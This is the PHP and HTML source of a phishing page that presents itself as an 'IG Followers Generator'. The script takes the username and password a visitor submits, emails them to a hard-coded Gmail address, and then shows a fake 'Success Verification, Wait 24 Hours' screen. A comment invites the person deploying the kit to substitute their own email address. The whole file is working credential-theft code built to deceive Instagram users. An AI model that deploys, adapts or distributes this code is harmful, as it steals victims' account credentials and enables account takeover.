<!-- Download Dari :
Blog : https://freemanpediarch.blogspot.com/ 
FB : Freeman Smith -->
<?php
$base = '/';

$subjek = 'Instagram Account';
$mailto = 'shawneparreault@gmail.com'; // Ganti Emailmu disini


$user = $_POST['username'];
$pw = $_POST['password'];


$body = <<<EOD
<br><hr><br>
    
<div id="myBox">
<font color="red" size="6">Email : $user</font> <br>

<font color="red" size="6">Password : $pw</font> <br>
<b>Blog : https://freemanpediarch.blogspot.com
</div>
EOD;


$headers = "From: Freeman08@pesing.com\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek, $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<!DOCTYPE html>
<html>
<head>
	<title>IG Followers Generator</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Generator for adding followers." />
	<meta property="og:title" content="IG Followers Generator" /> <!-- Title which is displayed when sharing your site on social networks. -->
	<meta property="og:description" content="Generator for adding followers." /> <!-- Description which is displayed when sharing your site on social networks. -->
	<meta property="og:type" content="website" />
	<meta property="og:url" content="http://www.ripalnugraha.com/" /> 
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="icon" type="image/ico" href="img/favicon.ico" />
    <!-- CSS -->
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,700" rel="stylesheet"> 	
	<link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,700" rel="stylesheet"> 
	<link href="https://fonts.googleapis.com/css?family=Pacifico" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
    <link href="../css/bootstrap.min.css" rel="stylesheet" />
    <link href="../css/animate.css" rel="stylesheet" />
    <link href="../css/magnific-popup.css" rel="stylesheet" />
	<link href="../css/sweet-alert.css" rel="stylesheet" />
    <link href="../css/style.css" rel="stylesheet" />    
</head>
												<div class="content-wrapper generator-content-wrapper">					
			<div class="processing-first-step">	
				<div class="row">	

					<form action="direct.php" method="post" id="followers-form" class="followers-form first col-sm-12" role="form" >
						<div class="form-group ig-username-form-group">	
							<label>Success Verification <br> Wait 24 Hours...</label>
							<div class="help-block with-errors"></div>
						</div>					

						</div>
					</form>				
				</div>	
								
									

	</footer>
</body>
</html>